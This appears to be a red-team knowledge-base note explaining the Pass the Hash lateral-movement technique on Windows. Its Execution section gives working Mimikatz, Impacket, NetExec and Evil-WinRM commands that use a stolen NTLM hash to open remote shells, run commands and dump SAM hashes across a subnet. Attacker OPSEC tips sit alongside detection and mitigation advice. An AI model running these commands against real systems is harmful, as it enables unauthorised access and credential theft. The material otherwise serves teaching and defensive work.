---
tags:
  - "#type/technique"
  - "#tactic/TA0008"
  - "#technique/T1550.002"
  - "#stage/lateral-movement"
  - "#os/windows"
  - "#protocol/ntlm"
  - "#tool/mimikatz"
  - "#tool/netexec"
  - "#tool/impacket"
aliases:
  - Pass the Hash
  - PtH
  - NTLM Relay
  - NT Hash Authentication

title: Pass the Hash
---

## Technique
___
Pass the Hash (PtH) is a lateral movement technique that allows an attacker to authenticate to a remote system or service using the NTLM hash of a user's password rather than the plaintext password itself. This technique takes advantage of how Windows implements NTLM authentication, where the password hash is used directly in the authentication process.

Since many organizations reuse local administrator credentials across multiple systems, obtaining the NTLM hash from one compromised system often enables an attacker to authenticate to other systems where the same account exists with the same password.

## Prerequisites
___

**Access Level:** Administrative access on at least one system to extract NTLM hashes, or the ability to capture NTLM authentication traffic.

**System State:** The target system must accept NTLM authentication (which is enabled by default in most Windows environments).

**Information:** Valid username and NTLM hash pairs.

**Restrictions:** This technique works primarily with the NTLM authentication protocol. It doesn't work with Kerberos authentication unless combined with other techniques like Overpass the Hash.

## Considerations
___

**Impact**

Successful Pass the Hash attacks allow an attacker to move laterally through a network without knowing plaintext passwords. If the hash belongs to a domain administrator or other privileged account, the attacker could potentially compromise the entire domain.

**OPSEC**

- **Authentication Logs:** NTLM authentication events are logged on target systems (Event ID 4624 with logon type 3).
- **Network Traffic:** NTLM authentication can be detected through network monitoring.
- **Tool Detection:** Tools like Mimikatz are commonly flagged by antivirus and EDR solutions.
- **Unusual Source:** Authentication attempts from unusual source hosts may trigger alerts.

## Execution
___

### Using Mimikatz

Mimikatz can be used to pass the hash from a Windows system:

```powershell
# Start a new process using a stolen hash
mimikatz # sekurlsa::pth /user:administrator /domain:contoso.local /ntlm:e2b475c11da2a0748290d87aa966c327
```

This will launch a new command prompt with a network logon session using the specified credentials.

### Using Impacket (from Linux)

Several Impacket tools support Pass the Hash:

```bash
# Access a remote shell using PsExec and a hash
impacket-psexec contoso.local/administrator@192.168.1.10 -hashes :e2b475c11da2a0748290d87aa966c327

# Access files using SMB and a hash
impacket-smbclient contoso.local/administrator@192.168.1.10 -hashes :e2b475c11da2a0748290d87aa966c327

# Execute WMI commands using a hash
impacket-wmiexec contoso.local/administrator@192.168.1.10 -hashes :e2b475c11da2a0748290d87aa966c327
```

### Using NetExec (from Linux)

NetExec is particularly useful for checking multiple systems:

```bash
# Test login against multiple hosts
nxc smb 192.168.1.0/24 -u administrator -H e2b475c11da2a0748290d87aa966c327

# Execute a command if login succeeds
nxc smb 192.168.1.0/24 -u administrator -H e2b475c11da2a0748290d87aa966c327 -x "whoami"

# Dump SAM hashes if login succeeds
nxc smb 192.168.1.0/24 -u administrator -H e2b475c11da2a0748290d87aa966c327 --sam
```

### Using Evil-WinRM (from Linux)

For systems with WinRM enabled:

```bash
evil-winrm -i 192.168.1.10 -u administrator -H e2b475c11da2a0748290d87aa966c327
```

## Cleanup Considerations
___

- Log out of any sessions created using Pass the Hash
- Close any command shells or connections opened with the technique
- Be aware that authentication events remain in the logs

## Detection & Mitigation
___

### Detection

- Monitor for Event ID 4624 (successful logon) with logon type 3 (network)
- Look for multiple logons with the same account from different source systems
- Monitor for suspicious execution of tools like Mimikatz
- Watch for NTLM authentication attempts in environments that primarily use Kerberos

### Mitigation

- **Implement LAPS (Local Administrator Password Solution):** Ensures local administrator accounts have unique passwords on each system
- **Restrict Local Admin Rights:** Limit which users have administrative access to workstations
- **Use Privileged Access Workstations (PAWs):** For administrative tasks
- **Enable Credential Guard:** In Windows 10/Server 2016 and later to protect credential material
- **Disable NTLM Authentication:** Where possible, forcing the use of Kerberos
- **Network Segmentation:** Limit lateral movement opportunities
- **Deploy Microsoft ATA/Defender for Identity:** To detect Pass the Hash and other credential theft techniques